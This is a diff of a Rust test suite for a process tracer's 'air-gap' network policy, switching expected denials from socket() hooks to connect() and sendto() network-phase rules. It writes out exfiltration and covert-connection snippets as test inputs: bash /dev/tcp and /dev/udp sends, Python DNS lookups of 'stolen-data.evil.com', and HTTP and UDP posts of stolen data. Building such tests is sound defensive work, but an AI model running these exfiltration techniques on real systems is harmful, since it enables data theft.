@@ -55,10 +55,11 @@ const POLICY: &str = "air-gap";
 fn test_air_gap_bypass_attempts() {
     setup();
 
-    // ── Vector 1: Native binary socket() — CAUGHT ──────────────────
+    // ── Vector 1: Native binary connect() — CAUGHT ─────────────────
     // malicious_target calls socket() + connect(127.0.0.1:4444).
-    // The policy's symbol deny installs hooks automatically — no need
-    // for a manual -s flag. The connect() is denied at the native level.
+    // The policy's network deny rules trigger native hook auto-installation.
+    // socket() is deferred (no destination info), but connect() is blocked
+    // by the network phase (network: deny: ["*"] matches all destinations).
     {
         let target = fixture("malicious_target");
         if target.exists() {
@@ -77,12 +78,12 @@ fn test_air_gap_bypass_attempts() {
             );
             let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
             let stderr = String::from_utf8_lossy(&output.stderr);
-            // socket() is called first with AF_INET, SOCK_STREAM args.
+            // connect() is denied by the network phase (deny: ["*"]).
             assert_denied!(
                 stdout,
                 stderr,
-                &["denied: socket(AF_INET, SOCK_STREAM"],
-                "Native socket(AF_INET, SOCK_STREAM) should be denied.",
+                &["denied: connect("],
+                "Native connect() should be denied by network deny rules.",
             );
         }
     }
@@ -104,9 +105,10 @@ fn test_air_gap_bypass_attempts() {
         );
     });
 
-    // ── Vector 3: Python socket — CAUGHT ────────────────────────────
+    // ── Vector 3: Python socket → connect — CAUGHT ─────────────────
     // Python's socket module calls libc socket()/connect() under the
-    // hood. The symbol deny list catches these C-level calls via malwi-intercept.
+    // hood. socket() is deferred (no destination), but connect() is
+    // blocked by the network phase (deny: ["*"]).
     skip_if_no_python_primary!(python => {
         let py_code = "import socket\ns=socket.socket()\ns.settimeout(1)\ntry:\n s.connect(('127.0.0.1',4444))\nexcept: pass";
         let output = run_tracer_with_timeout(
@@ -116,13 +118,14 @@ fn test_air_gap_bypass_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &["denied: socket(AF_INET, SOCK_STREAM"],
-            "Python socket(AF_INET, SOCK_STREAM) should be denied by symbol hooks.",
+            &["denied: connect("],
+            "Python connect() should be denied by network deny rules.",
         );
     });
 
     // ── Vector 4: Node.js net.connect — CAUGHT ──────────────────────
-    // Node.js net.connect calls libc connect(). Symbol deny catches it.
+    // Node.js net.connect calls libc connect(). The network phase
+    // blocks it (deny: ["*"]).
     skip_if_no_node_primary!(node => {
         let js_code = "const s=require('net').connect({port:4444,host:'127.0.0.1',timeout:1000}); \
                        s.on('error',()=>{}); s.on('timeout',()=>s.destroy()); \
@@ -134,15 +137,15 @@ fn test_air_gap_bypass_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &["denied: socket(AF_INET, SOCK_STREAM"],
-            "Node.js socket(AF_INET, SOCK_STREAM) should be denied by symbol hooks.",
+            &["denied: connect("],
+            "Node.js connect() should be denied by network deny rules.",
         );
     });
 
     // ── Vector 5: Bash /dev/tcp — CAUGHT ────────────────────────────
     // Bash's /dev/tcp is a shell built-in that opens a raw TCP socket
     // without forking any external command. But it still calls libc
-    // connect() internally, which the symbol deny list catches.
+    // connect() internally, which the network phase catches.
     skip_if_no_bash_primary!(bash => {
         let bash_code = "exec 3<>/dev/tcp/127.0.0.1/4444 2>/dev/null || true";
         let output = run_tracer_with_timeout(
@@ -152,8 +155,8 @@ fn test_air_gap_bypass_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: socket("],
-            "Bash /dev/tcp should be denied by network symbol.",
+            &["denied: connect(", "denied: getaddrinfo("],
+            "Bash /dev/tcp should be denied by network phase.",
         );
     });
 }
@@ -165,8 +168,8 @@ fn test_air_gap_exfiltration_attempts() {
     setup();
 
     // ── Exfil 1: DNS exfiltration via Python ─────────────────────────
-    // Encode stolen data as DNS subdomain labels. Caught by symbol deny
-    // on getaddrinfo (all DNS resolution goes through it).
+    // Encode stolen data as DNS subdomain labels. Caught by network phase
+    // on getaddrinfo (deny: ["*"] matches all destinations).
     skip_if_no_python_primary!(python => {
         let py_code = "import socket,time\ntry:\n socket.getaddrinfo('stolen-data.evil.com',80)\nexcept: pass\ntime.sleep(1)";
         let output = run_tracer_with_timeout(
@@ -176,14 +179,14 @@ fn test_air_gap_exfiltration_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &[r#"denied: getaddrinfo("stolen-data.evil.com", "80""#, "denied: syscall", "denied: socket("],
-            "DNS exfil via Python getaddrinfo(\"stolen-data.evil.com\", \"80\") should be denied.",
+            &[r#"denied: getaddrinfo("stolen-data.evil.com", "80""#, "denied: syscall", "denied: connect("],
+            "DNS exfil via Python getaddrinfo should be denied by network phase.",
         );
     });
 
     // ── Exfil 2: HTTP POST via Python urllib ─────────────────────────
-    // Classic data exfil via HTTP POST. Caught by symbol deny on
-    // socket/connect (urllib uses libc sockets underneath).
+    // Classic data exfil via HTTP POST. Caught by network phase on
+    // connect (urllib uses libc sockets underneath).
     skip_if_no_python_primary!(python => {
         let py_code = "import urllib.request,time\ntry:\n urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:4444',data=b'stolen',method='POST'),timeout=1)\nexcept: pass\ntime.sleep(1)";
         let output = run_tracer_with_timeout(
@@ -193,14 +196,15 @@ fn test_air_gap_exfiltration_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: socket("],
-            "HTTP POST exfil via Python urllib should be denied by network symbol.",
+            &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: connect("],
+            "HTTP POST exfil via Python urllib should be denied by network phase.",
         );
     });
 
     // ── Exfil 3: UDP fire-and-forget via Python ──────────────────────
     // UDP sendto() without connect() — fire-and-forget exfil.
-    // Caught by symbol deny on sendto (or socket).
+    // socket() is deferred (no destination info), but sendto() is blocked
+    // by the network phase (deny: ["*"] matches all destinations).
     skip_if_no_python_primary!(python => {
         let py_code = "import socket,time\ntry:\n s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n s.sendto(b'exfil',('127.0.0.1',4444))\nexcept: pass\ntime.sleep(1)";
         let output = run_tracer_with_timeout(
@@ -210,13 +214,13 @@ fn test_air_gap_exfiltration_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &["denied: socket(AF_INET, SOCK_DGRAM"],
-            "UDP exfil via Python socket(AF_INET, SOCK_DGRAM) should be denied.",
+            &["denied: sendto("],
+            "UDP exfil via Python sendto() should be denied by network deny rules.",
         );
     });
 
     // ── Exfil 4: Node.js HTTP POST exfil ─────────────────────────────
-    // http.request() to POST stolen data. Caught by symbol deny on
+    // http.request() to POST stolen data. Caught by network phase on
     // connect (Node.js HTTP uses libc sockets).
     skip_if_no_node_primary!(node => {
         let js_code = "\
@@ -234,14 +238,14 @@ fn test_air_gap_exfiltration_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &["denied: socket(AF_INET, SOCK_STREAM"],
-            "HTTP POST exfil via Node.js socket(AF_INET, SOCK_STREAM) should be denied.",
+            &["denied: connect("],
+            "HTTP POST exfil via Node.js connect() should be denied by network phase.",
         );
     });
 
     // ── Exfil 5: Node.js DNS exfiltration ────────────────────────────
-    // Encode data in DNS query via dns.resolve(). Caught by symbol
-    // deny on getaddrinfo.
+    // Encode data in DNS query via dns.resolve(). Caught by network
+    // phase on getaddrinfo (deny: ["*"]).
     skip_if_no_node_primary!(node => {
         let js_code = "\
             const dns = require('dns'); \
@@ -254,8 +258,8 @@ fn test_air_gap_exfiltration_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &["denied: socket(AF_INET, SOCK_DGRAM"],
-            "DNS exfil via Node.js dns.resolve socket(AF_INET, SOCK_DGRAM) should be denied.",
+            &["denied: getaddrinfo(", "denied: connect("],
+            "DNS exfil via Node.js should be denied by network phase.",
         );
     });
 
@@ -294,7 +298,7 @@ fn test_air_gap_exfiltration_attempts() {
 
     // ── Exfil 8: Bash /dev/udp exfil ───────────────────────────────
     // Fire-and-forget UDP exfil via bash builtin /dev/udp.
-    // Caught by symbol deny on socket/sendto (same mechanism as /dev/tcp).
+    // Caught by network phase on connect/sendto (deny: ["*"]).
     skip_if_no_bash_primary!(bash => {
         let bash_code = "echo stolen-data > /dev/udp/127.0.0.1/4444 2>/dev/null || true";
         let output = run_tracer_with_timeout(
@@ -304,8 +308,8 @@ fn test_air_gap_exfiltration_attempts() {
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
         let stderr = String::from_utf8_lossy(&output.stderr);
         assert_denied!(stdout, stderr,
-            &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: socket("],
-            "Bash /dev/udp should be denied by network symbol.",
+            &["denied: connect(", "denied: getaddrinfo("],
+            "Bash /dev/udp should be denied by network phase.",
         );
     });
 }
